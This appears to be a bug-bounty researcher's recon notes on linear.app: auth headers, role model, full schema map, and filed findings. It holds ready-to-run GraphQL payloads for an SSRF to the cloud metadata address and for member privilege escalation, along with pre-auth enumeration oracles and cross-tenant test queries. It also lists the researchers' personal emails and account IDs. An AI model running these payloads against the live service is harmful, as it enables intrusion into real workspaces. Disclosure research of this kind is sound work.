# linear.app — stack / schema reference

Accumulated from active hunts (2026-05-09 → 2026-05-19). Use this before
forming any new hypothesis against this target.

---

## Endpoints

| Endpoint | Protocol | Purpose |
|---|---|---|
| `client-api.linear.app/graphql` | HTTPS POST | Web-app GraphQL (cookie auth) |
| `api.linear.app/graphql` | HTTPS POST | Public API GraphQL (API key / OAuth) |
| `sync.linear.app` | WSS | Real-time sync engine (bespoke binary/framed protocol) |
| `uploads.linear.app` | HTTPS | Asset uploads (JWT-signed, `uploadsSig` cookie) |
| `storage.googleapis.com/uploads.linear.app/` | HTTPS | Underlying GCS bucket |
| `intake.linear.app` | SMTP | Email-to-issue intake |
| `mcp.linear.app` | HTTPS | Workspace MCP server (OAuth token required) |
| `api.linear.app/report-violation` | HTTPS POST | CSP report sink (`application/csp-report`) |

---

## Auth model

### client-api.linear.app/graphql (web app)

Requires **all four** of these simultaneously:

```
Cookie: session:<userAccountId>=<jwt>; uploadsSig:<userAccountId>=<jwt>; loggedIn=1
User: <org-membership-uuid>          ← scope anchor; server ignores Organization header
Organization: <org-uuid>             ← server IGNORES this; User header is authoritative
Useraccount: <userAccountId>
linear-client-version: <version>
linear-client-id: <client-uuid>
```

- `User` header is the org-membership UUID (NOT the userAccountId, NOT the org UUID). The membership UUID is returned in `availableUsers[].users[].id`.
- `Organization` header is **ignored** server-side — server derives org from the `User` membership UUID. Sending a cross-org `Organization` value does nothing.
- Without `User` + `Useraccount`, only `availableUsers` (account-scoped query) authenticates. All org-scoped queries return 401.
- Mismatched `User`→`Useraccount` returns "User does not exist or user account does not match".
- Sessions invalidate on logout / server rotation. Capture fresh from browser.

### api.linear.app/graphql (public API)

```
Authorization: lin_api_<key>         ← NO "Bearer" prefix, just the raw key
```

- Personal API keys are per-userAccount; key inherits caller's role in each org.
- Full introspection is enabled and OOS (per VDP) — use freely for schema enumeration.
- 341 mutations, 146 queries (as of 2026-05-18 introspection).

### sync.linear.app WebSocket

```
GET wss://sync.linear.app/?userAccountId=<acct>&userId=<membership>
Cookie: session:<jwt>; uploadsSig:<jwt>; loggedIn=1
Origin: https://linear.app
```

- Cookie is **NOT checked at handshake** — `101 Switching Protocols` returned with no cookie or mismatched params.
- Server gates auth on the **first message**, not on upgrade.
- Protocol is **bespoke** (not graphql-ws, not socket.io, not Replicache, not JSON-RPC). Standard handshake frames cause immediate 1006 close.
- First-frame format unknown — needs browser WS frame capture (DevTools → Network → WS → Messages).
- **Hypothesis:** if `userAccountId` URL param (not cookie) scopes messages post-auth, an attacker supplying a victim's `userAccountId` + `userId` could receive victim's sync stream without a valid session.

### uploads.linear.app

- Signed by `uploadsSig:<userAccountId>` JWT: `{userAccountId, organizationIds:[…], iat, exp}`.
- alg=none → 401 (signature is verified). Tampering blocked.
- GCS bucket: `linear-uploads-us-central1`. SA: `linear-server@linear-1.iam.gserviceaccount.com`.

---

## JWT shapes

```json
// session:<userAccountId>  — userAccount-scoped
{ "v": 2, "sessionId": "...", "userAccountId": "...", "createdAt": "...", "iat": 0 }

// uploadsSig:<userAccountId>  — org-list-scoped
{ "userAccountId": "...", "organizationIds": ["orgA-uuid", "orgB-uuid"], "iat": 0, "exp": 0 }
```

---

## Role model

| Concept | Notes |
|---|---|
| `admin` | `viewer.admin: true` — workspace admin |
| `guest` | `viewer.guest: true` — read-only per assigned teams |
| team `owner` | `teamMembership.owner: true` — team-level, distinct from workspace admin |
| member | default; `admin: false, guest: false` |

- Workspace `admin` ≠ team `owner`. Linear permissions (workflow state mgmt, cycle mgmt, template mgmt) are configurable **per team** by the team owner. Default: all members allowed.
- Guest BFLA surface is **fully enforced** — all admin/member-gated mutations return FORBIDDEN to guest role.
- Member BFLA surface is **partially permissive** (see findings 004 / 005).

---

## Key queries — copy-paste ready

### Account discovery (cookie auth, no org scope needed)
```graphql
query { availableUsers {
  email
  users {
    id                  # org-membership UUID → use as User header
    name email admin guest active
    organization {
      id urlKey name userCount
      region
    }
    userAccount { id }  # userAccountId
  }
} }
```

### Org-scoped viewer + org fields (full G1 probe)
```graphql
query G1 {
  viewer { id name email guest admin }
  organization {
    id name urlKey userCount
    samlEnabled scimEnabled allowedAuthServices
    linearAgentEnabled agentAutomationEnabled mcpServersEnabled
    aiAddonEnabled codingAgentEnabled
    hipaaComplianceEnabled
    trialStartsAt trialEndsAt
    subscription { type seats canceledAt }
    integrations { nodes { id service } }
    users(first: 100) { nodes { id name email displayName admin guest active lastSeen timezone createdAt } }
    templates { nodes { id name description } }
    samlSettings { ... }
    scimSettings { ... }
    securitySettings { agentGuidanceRole personalApiKeysRole }
    ipRestrictions { ... }
    aiProviderConfiguration { ... }
  }
}
```

### Pre-auth SAML/SSO enumeration (no auth required)
```graphql
# workspace existence + region oracle
query { organizationMeta(urlKey: "target-urlkey") { id region samlEnabled } }

# resolve workspace UUID from email domain + get IdP URL
query { ssoUrlFromEmail(email: "user@company.com") { samlSsoUrl idpId } }
# then: GET /auth/sso/<workspace-uuid>  → redirects to IdP
```

### Domain claim oracle (admin account needed, but free)
```graphql
mutation { organizationDomainCreate(input: { domain: "target.com" }) { success } }
# "Domain already claimed" → domain is claimed by another workspace
```

### Cross-tenant isolation test
```graphql
# As A1 — fetch resource seeded by A2 in a separate workspace
query { issue(id: "<uuid-from-other-workspace>") { id title } }
# Expected: "Entity not found"  (isolated)
# Vuln: any data returned
```

### Team privacy + membership check
```graphql
query { teams { nodes { id name private members { nodes { id name } } } } }
query { team(id: "<uuid>") { id name private } }
```

---

## Key mutations — known behavior

### Confirmed BFLA (member can call, docs say admin-only) — Finding 004
```graphql
mutation { teamMembershipCreate(input: { teamId: "<private-team>", userId: "<self-uuid>" }) { teamMembership { id } } }
mutation { teamUpdate(id: "<any-team>", input: { name: "renamed" }) { team { id } } }
mutation { workflowStateCreate(input: { teamId: "<any>", name: "x", type: started, color: "#fff" }) { workflowState { id } } }
mutation { emailIntakeAddressRotate(id: "<any>") { emailIntakeAddress { address } } }
mutation { templateCreate(input: { name: "x", templateType: issue }) { template { id } } }
```

### FORBIDDEN to guests (control surface)
```graphql
teamMembershipCreate, teamMembershipDelete (others), teamUpdate, workflowStateCreate,
emailIntakeAddressCreate/Rotate/Update/Delete, organizationInviteCreate/Delete,
webhookCreate, apiKeyCreate, userSuspend, userChangeRole, auditEntries,
integrationGitHubEnterpriseServerConnect, integrationMcpServerPersonalConnect,
userUpdate (other user), agentSessionCreate*
```

### Pre-auth callable mutations (no session)
```graphql
imageUploadFromUrl, emailUserAccountAuthChallenge, emailTokenUserAccountAuth,
samlTokenUserAccountAuth, googleUserAccountAuth, createOrganizationFromOnboarding,
joinOrganizationFromOnboarding, emailIntakeAddressCreate/Rotate/Update/Delete,
emailUnsubscribe, integrationGithubCommitCreate, organizationDeleteChallenge,
organizationDelete, userExternalUserDisconnect
```

### SSRF surfaces — Finding 003
```graphql
# integrationGitHubEnterpriseServerConnect — NO blocklist (stored SSRF)
mutation {
  integrationGitHubEnterpriseServerConnect(input: {
    githubUrl: "http://169.254.169.254"   # accepts any URL, success:true
    clientId: "x" clientSecret: "x"
  }) { success }
}

# imageUploadFromUrl — HAS blocklist (blocks internals)
mutation { imageUploadFromUrl(url: "http://169.254.169.254") { url } }
# → "Unable to fetch file (url)" for all internal IPs

# integrationMcpServerPersonalConnect — HAS blocklist; DOES forward customHeaders
# integrationGitlabConnect — HAS blocklist; sends private-token header to attacker URL
```

---

## Known defenses / blocklists

| Surface | Blocks | Notes |
|---|---|---|
| `imageUploadFromUrl` | 169.254.169.254, localhost, 10.x, 192.168.x, 172.16.x, metadata.google.internal, [::1], hex IPs, decimal IPs, octal IPs, nip.io | Error: "Unable to fetch file (url)", ~500ms uniform timing |
| `integrationGitHubEnterpriseServerConnect` | **None** | Accepts any URL including IMDS — filed as Finding 003 |
| `integrationMcpServerPersonalConnect` | Blocks internals | Forwards `customHeaders` to attacker URL (credential phishing) |
| `integrationGitlabConnect` | Blocks internals | Sends `private-token: <attacker-value>` to attacker URL |
| `issueImportCheckCSV` | Strict allowlist: `storage.googleapis.com/linear-imports-us-central1/` only | |
| `issueImportJqlCheck` | Blocks 169.254.169.254 | Sends attacker's `jiraToken` as `Authorization: Bearer` to attacker URL |
| `uploads.linear.app` JWT | alg=none → 401 | Signature verified |
| `emailUnsubscribe` | Token validated | `success:false` for random tokens |
| `organizationDomainVerify` | Brute-force codes rejected | |
| `fetchData` LLM nat-lang query | Row-level filter enforced at GraphQL execution | Guest cross-team data leakage blocked |

---

## Public infra fingerprint

| Item | Value |
|---|---|
| Server egress IP | `35.222.25.142` (GCP `us-central1`) |
| GCS bucket | `linear-uploads-us-central1` |
| GCS service account | `linear-server@linear-1.iam.gserviceaccount.com` (project `linear-1`) |
| Sentry public key | `f172c25063bf4e3492ece32b840ab90b` |
| Outbound HTTP UA (imageUpload) | `node-fetch/1.0` |
| Outbound HTTP UA (MCP integration) | `undici` |

---

## AI / Agent surface

```
linearAgentEnabled, agentAutomationEnabled, mcpServersEnabled — workspace flags
aiAddonEnabled — gates auto-summary generation (false on trial workspaces)
codingAgentEnabled — false unless Business+

agentSessionCreate* mutations → require OAuth app token (JWT session returns "unexpected auth method")
```

AI-generated fields: `Issue.summary`, `Issue.activitySummary`, `Document.summary`, `Comment.threadSummary` — backend cron, not user-callable.

Direct LLM queries:
- `customViewDetailsSuggestion(modelName, filter)` — exposes `modelName` arg
- `issueFilterSuggestion(prompt)` / `projectFilterSuggestion(prompt)` — guest access TBD
- `issueTitleSuggestionFromCustomerRequest(request)` → FORBIDDEN to guest

---

## Findings filed

| # | Slug | Status |
|---|---|---|
| 001 | guest-member-enumeration | N/A — Linear confirmed intentional (guests need @-mention data) |
| 002 | preauth-saml-idp-enumeration | Open — submitted |
| 003 | ghe-ssrf-missing-url-validation | Open — submitted |
| 004 | bfla-systemic-member-workspace-management | Withdrawn (first attempt) → refiled; awaiting triage |
| 005 | guest-team-access-loss-and-member-enumeration | N/A — recovery path exists via Team Settings panel |

---

## Operator accounts (do not commit creds — see session.txt)

Sessions captured 2026-05-19. uploadsSig tokens valid until ~2026-05-26.

| Label | userAccountId | Email | Role notes |
|---|---|---|---|
| **AA** (Account A) | `3beee2db` | youssef.3id@icloud.com | workspace **owner** of `youssef3id`; also in `test12m11`, `freeliner` |
| **AB** (Account B) | `99f426d6` | youssefmohammedeid0@gmail.com | admin of `freeliner`; guest in `youssef3id` |

### Membership UUIDs (User header values)

| Account | Org | urlKey | User (membership UUID) |
|---|---|---|---|
| AA | `26ade4e1` | youssef3id | `fab3c283-9dcd-4e09-8b8a-69d64412ecc8` |
| AA | `59a9ac1a` | test12m11 | TBD — re-confirm via `availableUsers` |
| AA | `62d03e86` | freeliner | TBD — re-confirm via `availableUsers` |
| AB | `62d03e86` | freeliner | `ad31825f-3101-4875-8a39-f947027d7d8e` |
| AB | `26ade4e1` | youssef3id | `8790df85-????` — re-confirm |

### Cross-workspace lab

```
youssef3id (26ade4e1):  AA = owner  |  AB = guest
freeliner  (62d03e86):  AB = admin  |  AA = role TBD

Cross-org test pattern:
  Seed resource as AA in youssef3id → fetch as AB using AB_FREELINER_USER
  Seed resource as AB in freeliner  → fetch as AA using AA_YOUSSEF3ID_USER
```

---

## Full schema surface map (live introspection 2026-05-19)

Source: `api.linear.app/graphql` introspection — no auth required. OOS per VDP but freely usable for mapping.
Total: **146 queries · 341 mutations**

### All queries (146)

```
agentActivities(filter,before,after,first,last,includeArchived,orderBy)
agentActivity(id)
agentSessions(before,after,first,last,includeArchived,orderBy)
agentSession(id)
agentSessionSandbox(agentSessionId)                    [Internal] coding agent sandbox detail
applicationInfo(clientId)
attachments(filter,before,after,first,last,includeArchived,orderBy)
attachment(id)                                         [Deprecated] url arg removed
attachmentsForURL(before,after,first,last,includeArchived,orderBy,url)
attachmentSources(teamId)                              [Internal]
auditEntryTypes()
auditEntries(filter,before,after,first,last,includeArchived,orderBy)
availableUsers()                                       account-scoped, no org header needed
authenticationSessions()                               caller's own active sessions
ssoUrlFromEmail(isDesktop,type,email)                  pre-auth SAML oracle (Finding 002)
comments(filter,before,after,first,last,includeArchived,orderBy)
comment(id,hash)
projects(filter,before,after,first,last,includeArchived,orderBy,sort)
project(id)
projectFilterSuggestion(teamId,projectId,prompt)       LLM filter suggestion
customViews(filter,before,after,first,last,includeArchived,orderBy,sort)
customView(id)
customViewDetailsSuggestion(modelName,filter)          [INTERNAL] exposes modelName arg
customViewHasSubscribers(id)
customerNeeds(filter,before,after,first,last,includeArchived,orderBy)
customerNeed(id,hash)
issueTitleSuggestionFromCustomerRequest(request)       LLM; FORBIDDEN to guest
customers(filter,before,after,first,last,includeArchived,orderBy,sorts)
customer(id)
customerStatuses(before,after,first,last,includeArchived,orderBy)
customerStatus(id)
customerTiers(before,after,first,last,includeArchived,orderBy)
customerTier(id)
cycles(filter,before,after,first,last,includeArchived,orderBy)
cycle(id)
documentContentHistory(id)
documentContentHistoryEntries(entryIds)                [Internal] fetch history by ID array — deleted content?
documents(filter,before,after,first,last,includeArchived,orderBy,sort)
document(id)
emailIntakeAddress(id)
emojis(before,after,first,last,includeArchived,orderBy)
emoji(id)
entityExternalLink(id)
externalUsers(before,after,first,last,includeArchived,orderBy)
externalUser(id)
favorites(before,after,first,last,includeArchived,orderBy)
favorite(id)
fetchData(query)                                       [Internal] LLM nat-lang GraphQL; row-level filter enforced
initiativeRelations(before,after,first,last,includeArchived,orderBy)
initiativeRelation(id)
initiatives(filter,before,after,first,last,includeArchived,orderBy,sort)
initiative(id)
initiativeToProjects(before,after,first,last,includeArchived,orderBy)
initiativeToProject(id)
initiativeUpdates(filter,before,after,first,last,includeArchived,orderBy)
initiativeUpdate(id)
integrations(before,after,first,last,includeArchived,orderBy)
integration(id)
verifyGitHubEnterpriseServerInstallation(integrationId)
integrationHasScopes(scopes,integrationId)
microsoftTeamsChannels()                               [Internal] lists MS Teams channels
integrationTemplates(before,after,first,last,includeArchived,orderBy)
integrationTemplate(id)
integrationsSettings(id)
issueImportCheckCSV(csvUrl,service)
issueImportCheckSync(issueImportId)
issueImportJqlCheck(jiraHostname,jiraToken,jiraEmail,jiraProject,jql)
issueLabels(filter,before,after,first,last,includeArchived,orderBy)
issueLabel(id)
issueRelations(before,after,first,last,includeArchived,orderBy)
issueRelation(id)
issues(filter,before,after,first,last,includeArchived,orderBy,sort)
issue(id)
issueSearch(filter,query,before,after,first,last,includeArchived,orderBy) [DEPRECATED]
issueVcsBranchSearch(branchName)                       branch name → issue (public branch → private meta?)
issueFigmaFileKeySearch(before,after,first,last,includeArchived,orderBy,fileKey)
issuePriorityValues()
issueFilterSuggestion(teamId,projectId,prompt)         LLM filter suggestion
issueRepositorySuggestions(agentSessionId,candidateRepositories,issueId) [Internal]
issueToReleases(before,after,first,last,includeArchived,orderBy)
issueToRelease(id)
notifications(filter,before,after,first,last,includeArchived,orderBy)
notificationsUnreadCount()                             [Internal]
notification(id)
notificationSubscriptions(before,after,first,last,includeArchived,orderBy)
notificationSubscription(id)
organizationDomainClaimRequest(id)                     [INTERNAL] pending claim status
organizationInvites(before,after,first,last,includeArchived,orderBy)
organizationInvite(id)
organizationInviteDetails(id)                          pre-auth; returns email/role/inviter/org
organization()
organizationExists(urlKey)
archivedTeams()                                        [Internal]
organizationMeta(urlKey)                               [INTERNAL] pre-auth workspace existence + region oracle
projectLabels(filter,before,after,first,last,includeArchived,orderBy)
projectLabel(id)
projectMilestones(filter,before,after,first,last,includeArchived,orderBy)
projectMilestone(id)
projectRelations(before,after,first,last,includeArchived,orderBy)
projectRelation(id)
projectStatuses(before,after,first,last,includeArchived,orderBy)
projectStatusProjectCount(id)                          [INTERNAL]
projectStatus(id)
projectUpdates(filter,before,after,first,last,includeArchived,orderBy)
projectUpdate(id)
pushSubscriptionTest(targetMobile,sendStrategy)        send push notif — whose device?
rateLimitStatus()                                      current rate limit state (useful for own probing)
releaseNotes(before,after,first,last,includeArchived,orderBy)
releaseNote(id)
releasePipelines(filter,before,after,first,last,includeArchived,orderBy,sort)
releasePipeline(id)
releasePipelineByAccessKey()                           access-key auth; scope unclear
latestReleaseByAccessKey()                             access-key auth
recentReleasesByAccessKey(limit)                       access-key auth
releases(filter,before,after,first,last,includeArchived,orderBy,sort)
release(id)
releaseSearch(filter,first,term)                       text search; Business+ scope enforced?
releaseStages(filter,before,after,first,last,includeArchived,orderBy)
releaseStage(id)
searchDocuments(before,after,first,last,includeArchived,orderBy,term,includeComments,teamId)
searchProjects(before,after,first,last,includeArchived,orderBy,term,includeComments,teamId)
searchIssues(filter,before,after,first,last,includeArchived,orderBy,term,includeComments,teamId)
semanticSearch(query,types,maxResults,includeArchived,filters)  NL search; guest scope enforced?
slaConfigurations(teamId)
teamMemberships(before,after,first,last,includeArchived,orderBy)  FORBIDDEN to guest
teamMembership(id)
teams(filter,before,after,first,last,includeArchived,orderBy)
administrableTeams(filter,before,after,first,last,includeArchived,orderBy)  diff vs teams — access ctrl check
team(id)
templates()
template(id)
templatesForIntegration(integrationType)
timeSchedules(before,after,first,last,includeArchived,orderBy)
timeSchedule(id)
triageResponsibilities(before,after,first,last,includeArchived,orderBy)
triageResponsibility(id)
users(filter,includeDisabled,before,after,first,last,includeArchived,orderBy,sort)
user(id)
viewer()                                               authenticated caller
userSessions(id)                                       [Internal] "admin only" — member BFLA candidate
userSettings()
webhooks(before,after,first,last,includeArchived,orderBy)
webhook(id)
failuresForOauthWebhooks(oauthClientId)                [INTERNAL] pre-auth 401 confirmed
workflowStates(filter,before,after,first,last,includeArchived,orderBy)
workflowState(id)
```

---

### All mutations (341)

```
# === FILE / ASSET ===
fileUpload(metaData,makePublic,size,contentType,filename)
importFileUpload(metaData,size,contentType,filename)
imageUploadFromUrl(url)                                blocklist active; Finding 003 class
fileUploadDangerouslyDelete(assetUrl)                  [Internal] FORBIDDEN to guest/member

# === AGENT ===
agentActivityCreate(input)
agentActivityCreatePrompt(input)                       [Internal] — bypasses OAuth app req? HIGH PRIORITY
agentActivitySendQueued(id)                            [Internal] — bypass queue
agentActivityDeleteQueued(id)                          [Internal]
agentSessionCreateOnComment(input)                     requires OAuth app token
agentSessionCreateOnIssue(input)                       requires OAuth app token
agentSessionCreate(pullRequestId,input)                [Internal] — on behalf of current user; OAuth bypass?
agentSessionUpdateExternalUrl(input,id)
agentSessionUpdate(input,id)

# === ATTACHMENT ===
attachmentCreate(input)
attachmentUpdate(input,id)
attachmentLinkURL(input)
attachmentLinkGitLabMR(input)
attachmentLinkGitHubIssue(input)
attachmentLinkGitHubPR(input)
attachmentLinkZendesk(input)
attachmentLinkDiscord(input)
attachmentSyncToSlack(input)
attachmentLinkSlack(input)
attachmentLinkFront(input)
attachmentLinkIntercom(input)
attachmentLinkJiraIssue(input)
attachmentLinkSalesforce(input)
attachmentDelete(id)

# === AUTH ===
emailUserAccountAuthChallenge(input)                   pre-auth
emailTokenUserAccountAuth(input)                       pre-auth
samlTokenUserAccountAuth(input)                        pre-auth
googleUserAccountAuth(input)                           pre-auth
passkeyLoginStart(input)                               [Internal]
passkeyLoginFinish(input)                              [Internal]
createOrganizationFromOnboarding(input)                pre-auth
joinOrganizationFromOnboarding(input)                  pre-auth; validates invite email = session email
leaveOrganization(input)
logout(input)
logoutSession(input)
logoutAllSessions(input)
logoutOtherSessions(input)

# === COMMENT ===
commentCreate(input)
commentUpdate(input,id)
commentDelete(id)
commentResolve(id,input)
commentUnresolve(id)

# === CONTACT ===
contactCreate(input)
contactSalesCreate(input)                              [Internal]

# === PROJECT ===
projectCreate(input)
projectUpdate(id,input)
projectCreateSlackChannel(id)                          [Internal]
projectReassignStatus(id,input)                        [Internal]
projectDelete(id)
projectUnarchive(id)
projectAddLabel(id,labelId)
projectRemoveLabel(id,labelId)
projectExternalSyncDisable(id)

# === CUSTOM VIEW ===
customViewCreate(input)
customViewUpdate(id,input)
customViewDelete(id)

# === CUSTOMER ===
customerNeedCreate(input)
customerNeedCreateFromAttachment(input)
customerNeedUpdate(id,input)
customerNeedDelete(id)
customerNeedArchive(id)
customerNeedUnarchive(id)
customerCreate(input)
customerUpdate(id,input)
customerDelete(id)
customerMerge(input)
customerUpsert(input)
customerUnsync(id)
customerStatusCreate(input)
customerStatusUpdate(id,input)
customerStatusDelete(id)
customerTierCreate(input)
customerTierUpdate(id,input)
customerTierDelete(id)

# === CYCLE ===
cycleCreate(input)                                     BFLA confirmed (Finding 004)
cycleUpdate(id,input)
cycleArchive(id)
cycleShiftAll(id,input)                                shift all cycle dates
cycleStartUpcomingCycleToday(id)                       time manipulation

# === DOCUMENT ===
documentCreate(input)
documentUpdate(id,input)
documentDelete(id)
documentUnarchive(id)

# === EMAIL INTAKE ===
emailIntakeAddressCreate(input)                        auth required (pre-auth myth debunked)
emailIntakeAddressRotate(id)                           BFLA confirmed (Finding 004)
emailIntakeAddressUpdate(id,input)                     BFLA confirmed (Finding 004)
emailIntakeAddressDelete(id)                           FORBIDDEN to member
emailUnsubscribe(input)                                pre-auth; token validated

# === EMOJI ===
emojiCreate(input)
emojiDelete(id)

# === ENTITY EXTERNAL LINK ===
entityExternalLinkCreate(input)
entityExternalLinkUpdate(id,input)
entityExternalLinkDelete(id)

# === TRACKING ===
trackAnonymousEvent(input)

# === FAVORITE ===
favoriteCreate(input)
favoriteUpdate(id,input)
favoriteDelete(id)

# === GIT AUTOMATION ===
gitAutomationStateCreate(input)
gitAutomationStateUpdate(id,input)
gitAutomationStateDelete(id)
gitAutomationTargetBranchCreate(input)
gitAutomationTargetBranchUpdate(id,input)
gitAutomationTargetBranchDelete(id)

# === INITIATIVE ===
initiativeRelationCreate(input)
initiativeRelationUpdate(id,input)
initiativeRelationDelete(id)
initiativeCreate(input)                                BFLA confirmed (Finding 004)
initiativeUpdate(id,input)
initiativeArchive(id)
initiativeUnarchive(id)
initiativeDelete(id)
initiativeAddLabel(id,labelId)                         [Internal]
initiativeRemoveLabel(id,labelId)                      [Internal]
initiativeToProjectCreate(input)
initiativeToProjectUpdate(id,input)
initiativeToProjectDelete(id)
initiativeUpdateCreate(input)
initiativeUpdateUpdate(id,input)
initiativeUpdateArchive(id)
createInitiativeUpdateReminder(id,input)
initiativeUpdateUnarchive(id)

# === INTEGRATION ===
integrationRequest(input)
integrationUpdate(id,input)                            [Internal]
integrationGithubCommitCreate(input)                   pre-auth
integrationGithubConnect(input)
integrationGithubRemoveCodeAccess(id)
integrationGithubImportConnect(input)
integrationGithubImportRefresh(id)
integrationGitHubEnterpriseServerConnect(input)        NO blocklist → SSRF (Finding 003)
integrationGitlabConnect(input)                        blocklist active; fwds private-token to attacker URL
integrationGitlabTestConnection(id)                    outbound HTTP request — SSRF candidate
airbyteIntegrationConnect(input)                       SSRF candidate — untested
integrationGoogleCalendarPersonalConnect(input)        [Internal]
integrationLaunchDarklyConnect(input)                  [Internal]
integrationLaunchDarklyPersonalConnect(input)          [Internal]
jiraIntegrationConnect(input)                          [Internal]
integrationJiraUpdate(id,input)                        [Internal]
integrationJiraFetchProjectStatuses(id)                [Internal]
integrationJiraPersonal(input)
integrationGitHubPersonal(input)
integrationIntercom(input)
integrationIntercomDelete(input)
integrationCustomerDataAttributesRefresh(id)           [Internal]
integrationDiscord(input)
integrationOpsgenieConnect(input)                      [Internal] SSRF candidate — untested
integrationOpsgenieRefreshScheduleMappings(id)         [Internal]
integrationPagerDutyConnect(input)                     [Internal] SSRF candidate — untested
integrationPagerDutyRefreshScheduleMappings(id)        [Internal]
updateIntegrationSlackScopes(input)                    [Internal]
integrationSlack(input)
integrationSlackAsks(input)
integrationSlackOrAsksUpdateSlackTeamName(input)
integrationSlackPersonal(input)
integrationAsksConnectChannel(input)
integrationSlackPost(input)
integrationSlackProjectPost(input)
integrationSlackInitiativePost(input)                  [Internal]
integrationSlackCustomViewNotifications(input)
integrationSlackCustomerChannelLink(input)
integrationSlackOrgProjectUpdatesPost(input)
integrationSlackOrgInitiativeUpdatesPost(input)        [Internal]
integrationSlackImportEmojis(input)
integrationFigma(input)
integrationGong(input)
integrationMicrosoftTeams(input)
integrationMicrosoftPersonalConnect(input)
integrationMicrosoftTeamsProjectPost(input)            [Internal]
integrationGoogleSheets(input)
refreshGoogleSheetsData(id)
integrationSentryConnect(input)
integrationFront(input)
integrationZendesk(input)
integrationSalesforce(input)
integrationSalesforceMetadataRefresh(id)               [Internal]
integrationMcpServerPersonalConnect(input)             [Internal] blocklist; fwds customHeaders to attacker URL
integrationMcpServerConnect(input)                     [Internal] workspace-level MCP; SSRF candidate
integrationDelete(id)
integrationArchive(id)
integrationSlackWorkflowAccessUpdate(input)            [Internal]
integrationTemplateCreate(input)
integrationTemplateDelete(id)
integrationsSettingsCreate(input)
integrationsSettingsUpdate(id,input)

# === ISSUE IMPORT ===
issueImportCreateGithub(input)
issueImportCreateJira(input)
issueImportCreateCSVJira(input)
issueImportCreateClubhouse(input)
issueImportCreateAsana(input)
issueImportCreateLinearV2(input)                       [Internal] Linear→Linear import; SCIM-aware
issueImportDelete(id)
issueImportProcess(id,input)
issueImportUpdate(id,input)

# === ISSUE LABEL ===
issueLabelCreate(input)
issueLabelUpdate(id,input)
issueLabelDelete(id)
issueLabelRetire(id)
issueLabelRestore(id)

# === ISSUE RELATION ===
issueRelationCreate(input)
issueRelationUpdate(id,input)
issueRelationDelete(id)

# === ISSUE ===
issueCreate(input)
issueBatchCreate(input)
issueUpdate(id,input)
issueBatchUpdate(input)
issueArchive(id,input)
issueUnarchive(id)
issueDelete(id)
issueAddLabel(id,labelId)
issueRemoveLabel(id,labelId)
issueReminder(id,input)
issueSubscribe(id)
issueUnsubscribe(id)
issueDescriptionUpdateFromFront(id,input)              [Internal]
issueExternalSyncDisable(id)
issueToReleaseCreate(input)
issueToReleaseDeleteByIssueAndRelease(input)
issueToReleaseDelete(id)

# === NOTIFICATION ===
notificationUpdate(id,input)
notificationMarkReadAll(input)
notificationMarkUnreadAll(input)
notificationSnoozeAll(input)
notificationUnsnoozeAll(input)
notificationArchive(id)
notificationArchiveAll(input)
notificationUnarchive(id)
notificationSubscriptionCreate(input)
notificationSubscriptionUpdate(id,input)

# === ORGANIZATION DOMAIN ===
organizationDomainClaim(input)                         [Internal]
organizationDomainVerify(input)                        [Internal] brute-force rejected
organizationDomainCreate(input)                        [Internal] domain claim oracle (Finding 002 extension)
organizationDomainUpdate(id,input)                     [Internal]
organizationDomainDelete(id)

# === ORGANIZATION INVITE ===
organizationInviteCreate(input)                        FORBIDDEN to guest/member
organizationInviteUpdate(id,input)
resendOrganizationInvite(id)
resendOrganizationInviteByEmail(input)
organizationInviteDelete(id)

# === ORGANIZATION ===
organizationUpdate(input)                              FORBIDDEN to member
organizationDeleteChallenge(input)                     pre-auth
organizationDelete(input)                              pre-auth
organizationCancelDelete(input)
organizationStartTrialForPlan(input)                   member/guest BFLA candidate — plan upgrade?

# === PROJECT LABEL ===
projectLabelCreate(input)
projectLabelUpdate(id,input)
projectLabelDelete(id)
projectLabelRetire(id)
projectLabelRestore(id)

# === PROJECT MILESTONE ===
projectMilestoneCreate(input)
projectMilestoneUpdate(id,input)
projectMilestoneDelete(id)
projectMilestoneMove(id,input)                         [Internal]

# === PROJECT RELATION ===
projectRelationCreate(input)
projectRelationUpdate(id,input)
projectRelationDelete(id)

# === PROJECT STATUS ===
projectStatusCreate(input)
projectStatusUpdate(id,input)
projectStatusArchive(id)
projectStatusUnarchive(id)

# === PROJECT UPDATE ===
projectUpdateCreate(input)
projectUpdateUpdate(id,input)
projectUpdateArchive(id)
projectUpdateUnarchive(id)
createProjectUpdateReminder(id,input)

# === PUSH SUBSCRIPTION ===
pushSubscriptionCreate(input)
pushSubscriptionDelete(input)

# === REACTION ===
reactionCreate(input)
reactionDelete(id)

# === RELEASE NOTES ===
releaseNoteCreate(input)
releaseNoteUpdate(id,input)
releaseNoteDelete(id)

# === RELEASE PIPELINE ===
releasePipelineCreate(input)
releasePipelineUpdate(id,input)
releasePipelineArchive(id)
releasePipelineUnarchive(id)
releasePipelineDelete(id)

# === RELEASE (access-key variants need key, not bearer token) ===
releaseSync(id,input)
releaseCreate(input)
releaseUpdate(id,input)
releaseComplete(id,input)
releaseUpdateByPipeline(input)
releaseDelete(id)
releaseArchive(id)
releaseUnarchive(id)
releaseSyncByAccessKey(input)                          access-key auth; scope tested?
releaseCompleteByAccessKey(input)                      access-key auth
releaseUpdateByPipelineByAccessKey(input)              access-key auth

# === RELEASE STAGE ===
releaseStageCreate(input)
releaseStageUpdate(id,input)
releaseStageArchive(id)
releaseStageUnarchive(id)

# === EXPORT ===
createCsvExportReport(input)                           bulk export — guest scope enforced?

# === DEPRECATED ===
roadmapToProjectCreate(input)                          [DEPRECATED]
roadmapToProjectUpdate(id,input)                       [DEPRECATED]
roadmapToProjectDelete(id)                             [DEPRECATED]

# === TEAM ===
teamKeyDelete(id)
teamMembershipCreate(input)                            BFLA confirmed (Finding 004) — member can self-join private teams
teamMembershipUpdate(id,input)
teamMembershipDelete(id)
teamCreate(input)
teamUpdate(id,input)                                   BFLA confirmed (Finding 004)
teamDelete(id)
teamUnarchive(id)
teamCyclesDelete(id)

# === TEMPLATE ===
templateCreate(input)                                  BFLA confirmed (Finding 004)
templateUpdate(id,input)                               BFLA confirmed (Finding 004)
templateDelete(id)                                     BFLA confirmed (Finding 004)

# === TIME SCHEDULE ===
timeScheduleCreate(input)
timeScheduleUpdate(id,input)
timeScheduleUpsertExternal(input)
timeScheduleDelete(id)
timeScheduleRefreshIntegrationSchedule(id)

# === TRIAGE ===
triageResponsibilityCreate(input)
triageResponsibilityUpdate(id,input)
triageResponsibilityDelete(id)

# === USER ===
userUpdate(id,input)                                   FORBIDDEN to guest for other users
userDiscordConnect(input)
userExternalUserDisconnect(input)                      pre-auth callable
